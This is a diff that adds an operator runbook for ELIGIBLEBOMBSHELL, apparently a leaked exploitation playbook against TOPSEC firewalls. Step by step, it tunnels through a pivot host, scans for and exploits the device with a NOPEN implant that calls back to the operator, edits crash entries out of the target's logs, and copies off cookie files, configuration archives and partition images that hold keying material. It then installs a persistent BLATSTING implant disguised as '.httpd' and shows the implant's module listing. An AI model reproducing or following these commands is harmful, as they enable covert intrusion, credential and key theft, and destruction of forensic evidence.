@@ -1,0 +1,309 @@
+###########################################################
+### 		OPSCRIPT FOR ELIGIBLEBOMBSHELL 		###
+###########################################################
+
+:syntax on
+
+# Use the following for VI Search and Replace from command mode
+
+mx
+:%s/ETAG/ETAG/g
+:%s/TARGET/TARGET/g
+:%s/RHP1/RHP1/g
+:%s/RHP2/RHP2/g
+:%s/RHP3/RHP3/g
+:%s/PITCH/PITCH/g
+'x 
+
+# Scan for ETAG and check ELBO.config for support
+grep "ETAG" ELBO.config
+
+# If entry is there, no need to use --scan, if no entry --scan is needed
+
+# On PITCH
+-tunnel
+l 443 TARGET
+r RHP1
+
+# Linux OPS Box 
+# use pitch window or have call back through -tunnel
+-nrtun RHP1
+cd /current/bin
+/current/bin/FW/NOPEN/noclient-3.0.5.3 -l RHP1
+
+# Scan to find (unknown versions) or confirm (known versions) vulnerability: 
+# 
+./eligiblebombshell_1.2.0.1.py -t 127.0.0.1 -e ETAG --scan --delay=5 --max-fails=15 --max-fails-action=5 -v
+
+ 
+
+#Then add the line it gives you to the ELBO.config
+#Most likely going to have to pull back files for DEV team
+
+#If target is vulnerable then exploit it:
+./eligiblebombshell_1.2.0.1.py -t 127.0.0.1 -e ETAG --nopen -c PITCH:RHP1 -v
+
+
+#If exploit is a success but there is no callback, run the following to delete NOPEN on target:
+./eligiblebombshell_1.2.0.1.py -t 127.0.0.1 -e ETAG --cleanup -v
+
+### Be aware if the hostname is "(none)" which is the defualt for this, it will cause some issues with NOPEN
+### NOPEN will hang, give it a couple minutes to return your prompt.
+### Also NOPEN will create a /down move this to /current/down/HOST.IP
+
+
+## Once on target we can get a second window via.
+
+
+## Local on pitch window
+-nrtun <RHP>
+
+## Target
+-call <PITCHIP> <RHP>
+
+# Delete uploaded NOPEN
+-rm /tmp/.httpd.dat
+
+# Delete tiny-exec binary -- May not have been uploaded
+# Typically not, only there if exploit had to sudo
+-lt /tmp/.httpd.bak
+-rm /tmp/.httpd.bak
+
+### CHECK LOG FILES ###
+# If exploit/scan worked, there should not be any logs
+-cd /tmp
+date
+-ls /data/oops*
+
+# Ensure that these logs are not HUGE, then pull them back
+-get /data/oops*
+
+# If small you can -cat the recent file to see if we are in it.
+-cat 
+
+#Locally make a backup copy
+cp oops# oops#.bak
+
+# VI the log with the timestamp closest to the system time
+# in another window, open the downloaded oops6 in a text editor
+# we want to remove all the references to crashes in auth.cgi; e.g.:
+#
+# process auth.cgi(pid 5932) segfault at virtual address 2aab757c, eip 2aab757c!
+# Process stack backtrace:   [<2aab757c>]
+#
+#
+# Info_name:/sys/tos/tos_version
+# v3.3.001.050.1
+#
+#
+# After removing those lines, put up the edited log with correct permissions
+# Change the # to the correct number
+# Answer YES to prompt overwrite
+
+#Use the following to change the HOST.IP
+mx
+:%s/HOST_NAME/_none_/g
+:%s/TARGET_IP/TARGET_IP/g
+'x
+
+# Run this to clean up local directories
+mergetargets  _.none._.TARGET_IP _none_.TARGET_IP
+
+
+
+-put /current/down/HOST.IP/data/oops# /data/oops# 4155
+
+-ls /data/oops*
+
+### RECON TIME ###
+# BUSYBOX comes already installed...pretty nice!!
+
+# Check for admin
+/bin/busybox ps -ef  >T:/current/down/ps.HOST_NAME.TARGET_IP
+/bin/busybox df -k  >T:/current/down/df.HOST_NAME.TARGET_IP
+
+# mkfinds will fail due to ( but do find still
+-find / /data  /sys /produce /se_mnt
+
+# To run mkfinds remove the ()
+# do this in local window from /current
+mergetargets  \(none\).TARGET_IP _none_.TARGET_IP
+
+mkfinds
+
+# sorted find will now be available
+
+# peridocally run the mergtargets command as needed to remove the ()'s from file structure
+# Ensure is done after Op over 
+# end rusult is no duplicates and everything in _none_.IP (the _ to signify something was replaced)
+mergetargets  \(none\).TARGET_IP _none_.TARGET_IP
+
+
+# If admin is logged in there will several -shell processes listed in the processlist
+# An admin can see a processlist (we are one of the tos_configd) and output of netstat
+# An admin can not see the file system or sniff traffic
+
+# Pull current ARP cache
+/bin/busybox cat /proc/tos/arp > T:/current/down/arp.HOST_NAME.TARGET_IP
+
+# Get uptime
+# First number is uptime in seconds; Second is idle time in seconds
+/bin/busybox cat /proc/uptime > T:/current/down/uptime.HOST_NAME.TARGET_IP
+
+/bin/busybox uptime > T:/current/down/wuptime.HOST_NAME.TARGET_IP
+
+#Get memory info and stats
+/bin/busybox cat /proc/meminfo > T:/current/down/meminfo.HOST_NAME.TARGET_IP
+
+#Get current routing table
+/bin/busybox cat /proc/tos/route > T:/current/down/route.HOST_NAME.TARGET_IP
+
+#Get current session information
+#Get overall firewall stats
+/bin/busybox cat /proc/tos/session > T:/current/down/session.HOST_NAME.TARGET_IP
+
+#Get kernel version
+/bin/busybox cat /proc/sys/kernel/version > T:/current/down/kernel.HOST_NAME.TARGET_IP
+
+#Get TOPSEC version
+/bin/busybox cat /etc/issue > T:/current/down/TOS.version.HOST_NAME.TARGET_IP
+
+
+#Get UNAME info
+
+uname -a > T:/current/down/uname-a.HOST_NAME.TARGET_IP
+
+#Pull back cookie files, may have passwords...will be a bunch of numbers
+-ls /www/cookie
+-get /www/cookie/############
+
+# Pull back config
+-ls /data/toscon*tgz
+-get /data/toscon*tgz
+
+# Peridically run
+
+##############################################################################
+# Files to pull back for the BLATSTING DEVs
+# Only needed if we have no BLATSTING Support
+# Typically around 25-30 MBs
+
+#Find the partitions with data in them
+df -k
+
+#Which will produce something like the following output:
+#Filesystem           1k-blocks      Used Available Use% Mounted on
+#rootfs                   15863     10936      4927  69% /
+#/dev/ramdisk             15863     10936      4927  69% /
+#/dev/hde7                 8259      7652       181  98% /sys
+#/dev/hde12                5334       232      4827   5% /data
+#/dev/hde11                1451        15      1362   1% /produce
+#/dev/hda13              209842     13066    185942   7% /se_mnt
+
+#Copy the four partitions with data, modifying the following command:
+
+dd if=/dev/hde## of=/tmp/tos_e##
+-ls /tmp/tos_e##
+-get /tmp/tos_e##
+-rm /tmp/tos_e##
+
+#Get these as well; they contain keying information
+
+dd if=/dev/hda1 of=/tmp/tos_a1 bs=512 count=1
+-ls /tmp/tos_a1
+-get /tmp/tos_a1
+-rm /tmp/tos_a1
+
+-get /sys/tos/tos.hc
+
+#Now, it turns out that some TopSec models have the kernel stored
+#in an alternate partion than those above.  Run the following command
+
+cat /proc/cmdline
+
+#Which will produce an output such as this:
+
+#console=ttyS0,9600  ramdisk_size=65536 prompt_ramdisk=0 STORE_TYPE=hd root=/dev/ramdisk
+#load_ramdisk=1 NORMAL_KERNEL_PT=/dev/hda5 NORMAL_ROOTFS_PT=/dev/hda6 
+#BACKUP_KERNEL_PT=/dev/hda8 BACKUP_ROOTFS_PT=/dev/hda9 NORMAL_SYS_PT=/dev/hda7 
+#BACKUP_SYS_PT=/dev/hda10 PRODUCE_PT=/dev/hda11 DATA_PT=/dev/hda12 SE_PT=/dev/hda13 
+#KERNEL_PT_SIZE=2M ROOTFS_PT_SIZE=3M SYS_MD=normal sessions=700000
+
+#Note the locations for "NORMAL_KERNEL_PT" and  "NORMAL_ROOTFS_PT".  If those
+#partions have not been copied, copy them as well.  They will constitute an extra
+#15 MB or so, bring the total download to close to 50 MB
+
+dd if=/dev/hda5 of=/tmp/tos_a5
+-ls /tmp/tos_a5
+-get /tmp/tos_a5
+-rm /tmp/tos_a5
+
+dd if=/dev/hda6 of=/tmp/tos_a6
+-ls /tmp/tos_a6
+-get /tmp/tos_a6
+-rm /tmp/tos_a6
+
+##############################################################################
+
+##############################################################################
+###			    BLATSTING INSTALL				   ###
+##############################################################################
+
+#Hopefully you built a keyed BLATSTING earlier for version 2.0.5.22
+
+#Verify target is what we expect
+uname -r
+
+#Upload blatsting to target
+#/data/.tos_cores is how BLATSTING persists, do not access it!!
+mkdir /data/.tos_cores
+-cd /tmp
+-put BLATSTING .httpd
+
+#Execute installer
+./.httpd; echo $?
+
+#Should return 0
+#Now connect to BLATSTING
+
+#On PITCH
+-tunnel
+u RHP2 TARGET
+
+cd /current/bin/FW/BLATSTING_20422/LP
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey /current/bin/FW/OPS/KEY --sport RHP3 --dport RHP2
+
+#
+#    Connect to the implant using option '1', and verify that the connection
+#    succeeds. Query the list of running modules (5 0 0).
+#
+
+10:17:37 2008-10-16  Menu Selection> 5 0 0
+10:17:39 2008-10-16  ===> selection 5 0 0
+Modules:
+  Module ID   Module type    Status     Persistence     State      Owned by
+                                                                   installer
+   0  0  3    core            running   persistent*     no state      n
+   5  0  3    install         running   persistent*     has state     n
+   2  0  1    file            running   persistent*     has state     n
+  12  1  1    bpf             running   persistent*     no state      n
+   3  0  2    network         running   persistent*     no state      n
+   1  1  1    crypto          running   persistent*     no state      n
+   8  1  1    hash            running   persistent*     no state      n
+   7  0  1    cnc             running   persistent*     no state      n
+
+10:17:39 2008-10-16  Menu Selection>
+
+##############################################################################
+# Check for files once more...just to be safe
+-lt /tmp/.httpd.dat
+-lt /tmp/.httpd.bak
+
+-ls /tmp/tos_a56
+-ls /tmp/tos_a6
+-ls /tmp/tos_a1
+
+#Burn...do not run -bb 
+-burn
+
+
